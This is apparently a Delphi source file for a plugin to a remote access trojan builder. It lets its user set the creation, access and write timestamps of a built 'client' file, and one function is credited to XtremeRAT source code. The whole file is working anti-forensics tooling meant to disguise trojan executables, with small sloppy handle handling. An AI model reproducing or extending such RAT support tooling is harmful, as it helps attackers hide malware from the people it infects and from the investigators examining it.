unit UnitMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, XPMan, StdCtrls, WinSkinData;

type
  TFormMain = class(TForm)
    lbl1: TLabel;
    edt1: TEdit;
    lbl2: TLabel;
    edt2: TEdit;
    btn1: TButton;
    xpmnfst1: TXPManifest;
    lbl3: TLabel;
    btn2: TButton;
    skndt1: TSkinData;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
  private
    { Private declarations }
    ClientPath: string;
  public
    { Public declarations }
    procedure SetInfos(_ClientPath: string);
  end;

var
  FormMain: TFormMain;

implementation

{$R *.dfm}

procedure TFormMain.SetInfos(_ClientPath: string);
begin
  ClientPath := _ClientPath;
end;

//From XtremeRAT 3.6 source code
function SetFileDateTime(FileName: PChar; Ano, Mes, Dia, Hora, minuto, segundo: WORD): Boolean;
var
  FileHandle: Integer;
  FileTime, LFT: TFileTime;
  LST: TSystemTime;
begin
  Result := False;
  try
    LST.wYear := Ano; //Minimum = 1601
    LST.wMonth := Mes;
    LST.wDay := Dia;

    LST.wHour := Hora;
    LST.wMinute := Minuto;
    LST.wSecond := Segundo;

    if SystemTimeToFileTime(LST, LFT) then
    begin
      if LocalFileTimeToFileTime(LFT, FileTime) then
      begin
        FileHandle := FileOpen(FileName, fmOpenReadWrite);
        if FileHandle <> INVALID_HANDLE_VALUE then
        if SetFileTime(FileHandle, @FileTime, @FileTime, @FileTime) then Result := True;
      end;
    end;
  finally
    FileClose(FileHandle);
  end;
end;

procedure TFormMain.btn1Click(Sender: TObject);
var
  TmpStr: string;
  Year, Month, Day,
  Hour, Min, Sec: Word;
begin
  if not FileExists(ClientPath) then
  MessageBox(Handle, PChar('File ' + ClientPath + ' not found.'), 'Date changer', MB_ICONERROR);

  if (edt1.Text = '') or (edt2.Text = '') then
    MessageBox(Handle, 'One ore more entries are empty.', 'Date changer', MB_ICONERROR)
  else
  begin
    TmpStr := edt1.Text;
    Day := StrToInt(Copy(TmpStr, 1, Pos('/', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('/', TmpStr));
    Month := StrToInt(Copy(TmpStr, 1, Pos('/', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('/', TmpStr));
    Year := StrToInt(TmpStr);

    TmpStr := edt2.Text;
    Hour := StrToInt(Copy(TmpStr, 1, Pos(':', TmpStr) - 1));
    Delete(TmpStr, 1, Pos(':', TmpStr));
    Min := StrToInt(Copy(TmpStr, 1, Pos(':', TmpStr) - 1));
    Delete(TmpStr, 1, Pos(':', TmpStr));
    Sec := StrToInt(TmpStr);

    if SetFileDateTime(PChar(ClientPath), Year, Month, Day, Hour, Min, Sec) then
      MessageBox(Handle, 'Done!', 'Date changer', MB_ICONINFORMATION)
    else MessageBox(Handle, 'Failed to change client date creation.', 'Date changer', MB_ICONERROR);
  end;
end;

procedure TFormMain.btn2Click(Sender: TObject);
begin
  MessageBox(Handle, 'This plugin allow you to change date/time creation of built client file.' + #13#10 +
    'Copyright (c) 2016-2017 J3kill Soft. by wrh1d3', 'Date changer', MB_ICONINFORMATION);
end;

end.
